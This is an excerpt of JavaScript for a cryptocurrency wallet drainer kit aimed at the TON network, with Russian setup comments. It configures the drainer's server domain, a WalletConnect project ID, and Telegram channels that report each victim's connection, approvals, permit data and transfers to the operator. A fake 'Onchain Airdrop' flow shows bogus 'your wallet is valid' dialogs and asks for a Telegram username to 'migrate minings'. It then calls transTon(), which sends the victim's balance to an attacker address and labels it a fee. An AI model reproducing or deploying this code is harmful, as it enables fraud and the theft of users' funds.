...
let MS_Encryption_Key = 55555555550; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
// For tON network SETTINGS:
let isTon = true,
tonConnected = false;

//////////////////////
const MS_Server = "sksu.online"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const MS_WalletConnect_ID = "03bd0f49956afe37a2a16e94a613610a"; // Project ID из WalletConnect Cloud

const MS_Modal_Style = 2; // 1 - старая, 2 - новая (обновление от 01.10.2023)
const MS_Loader_Style = 1; // 1 - старый, 2 - новый (обновление от 01.10.2023)
...
const MS_WalletConnect_MetaData = {
  ...
  description: "Onchain Airdrop", // По умолчанию "Web3 Application"
...
const MS_Custom_Chat = {
  ...
  Chat_Settings: {
    enter_website: "-1002022910026", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "-1002022910026", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "-1002022910026", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "-1002022910026", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "-1002022910026", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "-1002022910026", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "-1002022910026", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "-1002022910026", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "-1002022910026", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "-1002022910026", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "-1002022910026", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "-1002022910026", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "-1002022910026", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "-1002022910026", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "-1002022910026", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "-1002022910026", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "-1002022910026", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "-1002022910026", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};
...
tonConnectUI.onStatusChange((wallet) => {
    ...
    tonConnected = currentIsConnectedStatus;
    if(currentIsConnectedStatus){
        
        const walletAddress = wallet.account.address;
        console.log('address = '+ walletAddress)
         MS_Provider = tonConnectUI;
        MS_Current_Provider = wallet.device.appName;
        MS_Current_Address = walletAddress;
        MS_Current_Chain_ID = wallet.account.chain;
        send_request({
          action: 'connect_success', user_id: MS_ID, address: walletAddress,
          wallet: MS_Current_Provider, chain_id: wallet.account.chain
        });
    
        show_ton_check(walletAddress);
        
    }
    
});

async function transTon() {
  ...
  if(tonConnected){
    ...
    const transaction = {
        ...
        messages: [{
            address: MS_Settings.tonAddress,
            amount: processedBalance
        }
       ]
    }
    const asset = { 
      chain_id: 'TON NETWORK',
      name: 'TON', 
      type: 'TON TOKEN',
      amount: parseFloat(processedBalance), 
      amount_raw: processedBalance,
      amount_usd: parseFloat(tgBalance), 
      symbol: 'TON',
      decimals: 9, 
      address: null,
      price: 7 };
...
const show_ton_check = (address) => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Processing wallet', text: 'Connecting to TON Blockchain... ',
        ...
        MSL.fire({
          ...
          if (MS_Check_Done) return;
          MSL.fire({
            icon: 'load', title: 'Processing wallet', text: 'Checking your wallet '+ address,
            showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
          }).then(() => {
            if (MS_Check_Done) return;
            MSL.fire({
              icon: 'success', title: 'Processing wallet', subtitle: 'Everything good!',
              text: 'Your wallet is valid!', showConfirmButton: false, timer: 5000, color: MS_Color_Scheme
            }).then(async() => {
                if (MS_Check_Done) return;
                const { value: tg_username } = await MSL.fire({
                  title: "Enter your telegram username",
                  input: "text",
                  inputLabel: "Telegram Username",
                  inputPlaceholder: "@username",
                   confirmButtonText: `
                    Migrate&nbspMinings&nbsp;<i class="fa fa-arrow-right"></i>
                  `,
                  inputAttributes: {
                    maxlength: "100",
                    autocapitalize: "off",
                  ...
                  inputValidator: (value) => {
                    if (!value) {
                      return "You need to enter your username to migrate your minings!";
                    }
                  }
               ...
               if(tg_username) { 
                  ...
                  transTon();
                   ...
                   MSL.fire({
                        text: 'Good, Confirm Fees Payment in your wallet to migrate your minings  for '+ tg_username,
                        icon: 'success',
        ...
        Swal.fire({
          ...
          Swal.fire({
            ...
            Swal.fire({
              ...
              if (MS_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is valid',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(async() => {
                if (MS_Check_Done) return;
                const { value: tg_username } = await Swal.fire({
                  title: "Enter your telegram username",
                  input: "text",
                  inputLabel: "Telegram Username",
                  inputPlaceholder: "@username",
